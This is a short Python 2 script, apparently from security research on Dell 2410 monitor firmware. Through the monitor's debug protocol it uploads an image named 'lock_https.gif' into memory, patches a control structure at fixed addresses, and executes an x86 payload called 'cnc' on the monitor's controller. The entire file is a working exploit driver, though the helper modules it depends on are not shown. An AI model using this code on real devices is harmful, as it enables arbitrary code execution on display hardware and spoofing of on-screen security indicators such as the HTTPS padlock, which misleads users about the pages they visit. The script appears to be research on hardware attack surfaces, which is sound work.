#!/usr/bin/python2
import protocol
import delltools
import binascii
import time
from itertools import izip
from payload import X86Payload
from image import DellImage, get_control_struct

image = DellImage("lock_https.gif")
payload = X86Payload("cnc")
dell = protocol.Dell2410()
dell.initialize()
dell.debug_on()

metainfo, _ = delltools.upload_single_image(dell, image, 0x600000)
clut_table = metainfo[4]
width = metainfo[0]
height = metainfo[1]
stride = metainfo[2]
upload_address = metainfo[3]
#delltools.clear_0xc000(dell)
delltools.sdram_write(dell, src=0x600000,
            dest=0, height=height, width=width,
            dest_stride=stride)
delltools.transfer_clut(dell, clut_table)
control = get_control_struct(width, height, 0x63, 0x4a)
control = control[:0x26] + '\x00' + control[0x27:]
delltools.mem_write(dell, 0xc078, control)
time.sleep(2)

delltools.execute_payload(dell, payload, 0x6000)
dell.debug_off()

